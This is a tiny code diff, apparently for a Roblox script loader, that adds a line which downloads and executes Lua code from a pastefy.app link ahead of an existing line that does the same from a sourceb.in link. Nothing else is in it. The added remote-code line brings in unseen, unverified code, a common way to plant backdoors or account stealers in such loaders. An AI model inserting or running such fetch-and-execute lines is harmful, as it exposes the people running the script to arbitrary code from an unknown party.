@@ -1,1 +1,5 @@
+loadstring(game:HttpGet'https://pastefy.app/bTsiMiME/raw')()
+ 
+task.wait(3)
+
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/qrpkVUKQ9z/0", true))()
